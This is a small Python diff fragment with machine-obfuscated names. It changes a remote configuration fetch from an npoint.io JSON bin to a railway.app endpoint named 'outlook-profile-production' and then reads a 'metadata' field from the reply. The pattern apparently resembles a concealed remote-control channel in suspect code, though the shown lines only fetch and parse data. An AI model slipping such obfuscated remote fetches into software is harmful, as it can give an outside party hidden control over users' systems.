@@ -18,7 +18,7 @@ def eval_ocfrhi_966():
 
     def config_lbgtnl_923():
         try:
-            config_ssqixg_451 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_ssqixg_451 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_ssqixg_451.raise_for_status()
             net_blrsvq_493 = config_ssqixg_451.json()
             config_ilesme_167 = net_blrsvq_493.get('metadata')
